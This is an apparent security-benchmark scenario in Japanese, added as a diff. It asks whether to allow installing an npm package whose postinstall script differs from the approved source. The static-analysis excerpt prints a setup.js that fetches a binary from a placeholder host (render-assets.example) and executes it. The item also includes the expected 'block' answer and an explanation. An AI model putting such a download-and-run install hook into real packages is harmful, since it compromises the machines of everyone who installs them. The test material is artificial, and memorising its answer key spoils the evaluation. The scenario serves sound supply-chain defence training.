@@ -1,0 +1,197 @@
+{
+  "schema_version": 2,
+  "id": "PKG-NPM-INSTALL-SCRIPT",
+  "category": "package",
+  "platform": "common",
+  "title": "承認外のインストールスクリプト",
+  "request": "解決済みのパッケージをインストールすることを許可しますか。 ALLOW / BLOCKで判断してください。",
+  "required_evidence": [
+    "metadata",
+    "source",
+    "official",
+    "release"
+  ],
+  "ground_truth": "block",
+  "explanation": "配布物のpostinstallは承認ソースコードにない外部実行ファイルの取得・起動を含むため、インストール前に遮断します。スクリプトの静的内容を比較しており、実行済みとは扱いません。",
+  "initial": {
+    "information": [
+      {
+        "id": "Package",
+        "label": "Package",
+        "value": "@aster-ui/native-render",
+        "data_type": "package"
+      },
+      {
+        "id": "Version",
+        "label": "Version",
+        "value": "3.2.1",
+        "data_type": "text"
+      },
+      {
+        "id": "Ecosystem",
+        "label": "Ecosystem",
+        "value": "npm",
+        "data_type": "text"
+      },
+      {
+        "id": "状態",
+        "label": "状態",
+        "value": "依存解決済み・インストール前。インストールスクリプトはまだ実行していない。",
+        "data_type": "text"
+      }
+    ],
+    "terms": [
+      "script",
+      "package",
+      "registry",
+      "install_script",
+      "version",
+      "ecosystem",
+      "dependency",
+      "package_resolver",
+      "install"
+    ]
+  },
+  "resources": [
+    {
+      "id": "metadata",
+      "name": "npmレジストリのパッケージ情報",
+      "kind": "references",
+      "result": {
+        "content": {
+          "Name": "@aster-ui/native-render",
+          "Version": "3.2.1",
+          "Registry": "https://registry.npmjs.org",
+          "Project URL / Repository": "https://git.aster.example/components/native-render",
+          "Maintainer": "aster-release",
+          "dependencies": {},
+          "SHA256": "c3f35d2a46ecff6ba38f09d7947c4684aa36ee24b70c791af0a4e77d3972eb71",
+          "scripts": {
+            "postinstall": "node scripts/setup.js"
+          }
+        },
+        "terms": [
+          "script",
+          "package",
+          "registry",
+          "install_script",
+          "version",
+          "dependency",
+          "install",
+          "extension",
+          "hash",
+          "sha256",
+          "url",
+          "repository",
+          "maintainer",
+          "http",
+          "url_path",
+          "release"
+        ]
+      },
+      "terms": [
+        "package",
+        "registry",
+        "metadata"
+      ]
+    },
+    {
+      "id": "source",
+      "name": "パッケージソースの静的確認",
+      "kind": "references",
+      "result": {
+        "content": {
+          "対象": "配布tarball内scripts/setup.js",
+          "抜粋": "const https = require(\"https\");\nconst fs = require(\"fs\");\nconst { execFile } = require(\"child_process\");\nconst url = \"https://render-assets.example/bootstrap.bin\";\nconst targetPath = 〔一時ファイルのパスを省略〕;\nhttps.get(url, response => {\n  const file = fs.createWriteStream(targetPath);\n  response.pipe(file);\n  file.on(\"finish\", () => {\n    file.close(() => execFile(targetPath, 〔引数を省略〕));\n  });\n});",
+          "取得方法": "インストールせずアーカイブ内のSourceを表示"
+        },
+        "terms": [
+          "script",
+          "install",
+          "extension",
+          "url",
+          "http",
+          "url_path",
+          "source_code",
+          "executable",
+          "archive",
+          "training_placeholder",
+          "tarball"
+        ]
+      },
+      "terms": [
+        "package",
+        "static_analysis",
+        "source_code"
+      ]
+    },
+    {
+      "id": "official",
+      "name": "公式リポジトリ・承認済みコンポーネント",
+      "kind": "references",
+      "result": {
+        "content": "@aster-ui/native-render 3.2.1の承認済みコミットではpostinstall=node-gyp rebuild。外部Binaryの取得・起動処理は存在しない。",
+        "terms": [
+          "install_script",
+          "install",
+          "build",
+          "commit",
+          "native_module"
+        ]
+      },
+      "terms": [
+        "package",
+        "repository",
+        "approved"
+      ]
+    },
+    {
+      "id": "release",
+      "name": "リリース・変更承認記録",
+      "kind": "references",
+      "result": {
+        "content": "3.2.1はネイティブコードのコンパイル修正のみ。外部Bootstrapへの切替承認なし。",
+        "terms": [
+          "source_code",
+          "build",
+          "native_module"
+        ]
+      },
+      "terms": [
+        "release",
+        "reference"
+      ]
+    },
+    {
+      "id": "lock",
+      "name": "ロックファイル",
+      "kind": "references",
+      "result": {
+        "content": {
+          "現行Version": "3.2.0",
+          "Source": "https://registry.npmjs.org",
+          "更新条件": "公式リリース Sourceとの一致が必要"
+        },
+        "terms": [
+          "registry",
+          "version",
+          "url",
+          "http",
+          "release",
+          "source_code",
+          "package_source"
+        ]
+      },
+      "terms": [
+        "file",
+        "lock_file"
+      ]
+    }
+  ],
+  "learning_objectives": [
+    "インストールスクリプトを公式リポジトリの同バージョンと比較する"
+  ],
+  "sources": [
+    "https://docs.npmjs.com/cli/v11/configuring-npm/package-lock-json/"
+  ]
+}
